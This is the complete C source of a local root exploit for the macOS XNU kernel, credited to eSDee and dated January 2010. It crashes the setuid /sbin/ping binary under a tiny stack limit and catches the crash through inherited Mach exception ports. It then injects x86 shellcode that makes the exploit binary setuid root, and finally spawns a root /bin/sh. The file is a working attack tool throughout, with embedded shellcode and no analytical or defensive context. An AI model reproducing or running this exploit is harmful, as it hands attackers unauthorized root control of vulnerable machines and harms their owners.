/* 5 January 2010 - XNU local root exploit by eSDee (esdee@promisc.org)
*/

#define SUID_BINARY "/sbin/ping"

#include <stdio.h>
#include <stdlib.h>
#include <sys/time.h>   
#include <sys/resource.h>
#include <sys/wait.h>
#include <unistd.h>
#include <mach/mach.h>

extern boolean_t exc_server(mach_msg_header_t *, mach_msg_header_t *);

unsigned char 
x86_xnu_chown_chmod[] =

        "\x31\xc0"              /* xor      %eax, %eax        */
        "\xbb\x44\x43\x42\x41"  /* mov      $0x41424344, %ebx */
        "\x50"                  /* pushl    %eax              */
        "\x50"                  /* pushl    %eax              */
        "\x53"                  /* pushl    %ebx              */
        "\x50"                  /* pushl    %eax              */
        "\xb0\x10"              /* mov      $0x10, %al        */
        "\xcd\x80"              /* int      $0x80             */
        "\x31\xc0"              /* xor      %eax, %eax        */
        "\x66\x0d\xed\x0d"      /* or       $0xded, %ax       */
        "\x50"                  /* pushl    %eax              */
        "\x53"                  /* push     %ebx              */
        "\x50"                  /* pushl    %eax              */
        "\x31\xc0"              /* xor      %eax, %eax        */
        "\xb0\x0f"              /* mov      $0xf, %al         */
        "\xcd\x80"              /* int      $0x80             */
        "\xb0\x01"              /* mov      $0x1, %al         */
        "\x50"                  /* push     %eax              */
        "\x50"                  /* push     %eax              */
        "\xcd\x80";             /* int      $0x80             */



char *
get_path_self(void)
{
        char *ret = NULL;

        char path_self[1024];

        size_t size = sizeof(path_self);

        if (_NSGetExecutablePath(path_self, &size) != 0) {
                fprintf(stderr, "_NSGetExecutablePath: Failed.\r\n");
                exit(EXIT_FAILURE);
        }

        if (!(ret = strdup(path_self))) {
                perror("strdup");
                exit(EXIT_FAILURE);
        }

        return ret;
}

void
crash_suid_binary(void)
{
        struct rlimit limit;

        char *argv[] = { SUID_BINARY, NULL };

        limit.rlim_cur = 100;
        limit.rlim_max = 100;

        fprintf(stdout, "[!] Executing \"%s\" ...\r\n", argv[0]);

        if (setrlimit(RLIMIT_STACK, &limit) < 0) {
                perror("setrlimit");
                exit(EXIT_FAILURE);
        }

        execve(argv[0], argv, NULL);

        _exit(EXIT_FAILURE);    
}



kern_return_t   
catch_exception_raise(  mach_port_t             exception_port,
                        mach_port_t             thread,
                        mach_port_t             task,
                        exception_type_t        exception,
                        exception_data_t        code,
                        mach_msg_type_number_t  code_count)
{

        thread_act_port_array_t         thread_list;

        i386_thread_state_t             i386_state;

        mach_msg_type_number_t          state_count     = i386_THREAD_STATE_COUNT;
        mach_msg_type_number_t          thread_count    = 0;

        vm_address_t                    address         = 0;
        vm_address_t                    address_path    = 0;

        char *path_self = get_path_self();

        if (task_suspend(task) != KERN_SUCCESS) {
                fprintf(stderr, "task_suspend: failed.\r\n");
                exit(EXIT_FAILURE);
        }

        if (vm_allocate(task, &address, sizeof(x86_xnu_chown_chmod), TRUE) != KERN_SUCCESS) {
                fprintf(stderr, "vm_allocate: failed.\r\n");
                exit(EXIT_FAILURE);
        }

        if (vm_allocate(task, &address_path, strlen(path_self), TRUE) != KERN_SUCCESS) {
                fprintf(stderr, "vm_allocate: failed.\r\n");
                exit(EXIT_FAILURE);
        }
        
        memcpy(&x86_xnu_chown_chmod[3], &address_path, sizeof(address));

        if (vm_write(task, address, (pointer_t)&x86_xnu_chown_chmod, sizeof(x86_xnu_chown_chmod)) != KERN_SUCCESS) {
                fprintf(stderr, "vm_write: failed.\r\n");
                exit(EXIT_FAILURE);
        }

        if (vm_write(task, address_path, (pointer_t)path_self, strlen(path_self) + 1) != KERN_SUCCESS) {
                fprintf(stderr, "vm_write: failed.\r\n");
                exit(EXIT_FAILURE);
        }

        free(path_self);

        /* Set the thread state .. */

        if (task_threads(task, &thread_list, &thread_count) != KERN_SUCCESS) {
                fprintf(stderr, "task_threads: failed.\r\n");
                exit(EXIT_FAILURE);
        }

        if (thread_get_state(   thread_list[0],
                                i386_THREAD_STATE,
                                (thread_state_t)&i386_state,
                                &state_count)) {
                fprintf(stderr, "thread_get_state: failed.\r\n");
                exit(EXIT_FAILURE);
        }

        i386_state.__eip = address;
        i386_state.__esp = i386_state.__ebp;

        if (thread_set_state(   thread_list[0],
                                i386_THREAD_STATE,
                                (thread_state_t)&i386_state,
                                state_count)) {
                fprintf(stderr, "thread_set_state: failed.\r\n");
                exit(EXIT_FAILURE);
        }
        
        if (task_resume(task) != KERN_SUCCESS) {
                fprintf(stderr, "task_resume: failed.\r\n");
                exit(EXIT_FAILURE);
        }
        
        return KERN_SUCCESS;
}

int 
main(void) 
{
        char *_argv[]   = { get_path_self(), NULL };
        char *shell[]   = { "/bin/sh", NULL };

        uid_t uid       = getuid();
        gid_t gid       = getgid();

        mach_port_t exc;
        
        if (!setuid(0)) {

                /* Restore the original permissions first... */

                setgid(0);              

                if (chmod(_argv[0], 0755) < 0)
                        perror("chmod");

                if (chown(_argv[0], uid, gid) < 0)
                        perror("chown");

                system("sync");

                execve(shell[0], shell, NULL);

                _exit(EXIT_FAILURE);
        }


        if (mach_port_allocate(         mach_task_self(), 
                                        MACH_PORT_RIGHT_RECEIVE, 
                                        &exc) != KERN_SUCCESS) {

                fprintf(stderr, "mach_port_allocate: failed.\r\n");
                exit(EXIT_FAILURE);
        }

        if (mach_port_insert_right(     mach_task_self(), 
                                        exc, 
                                        exc, 
                                        MACH_MSG_TYPE_MAKE_SEND) != KERN_SUCCESS) {

                fprintf(stderr, "mach_port_insert_right: failed.\r\n");
                exit(EXIT_FAILURE);
        }

        if (task_set_exception_ports(   mach_task_self(),
                                        EXC_MASK_BAD_ACCESS, 
                                        exc,
                                        EXCEPTION_DEFAULT,
                                        i386_THREAD_STATE) != KERN_SUCCESS) {

                fprintf(stderr, "task_set_exception_ports: failed.\r\n");
                exit(EXIT_FAILURE);
        }

        switch(vfork()) {
                case -1:
                        perror("vfork");        
                        _exit(EXIT_FAILURE);
                case 0:
                        crash_suid_binary();
                default:
                
                        mach_msg_server_once(exc_server, 512, exc, 0);

                        sleep(1);

                        execve(_argv[0], _argv, NULL);
        }

        return 0;
}
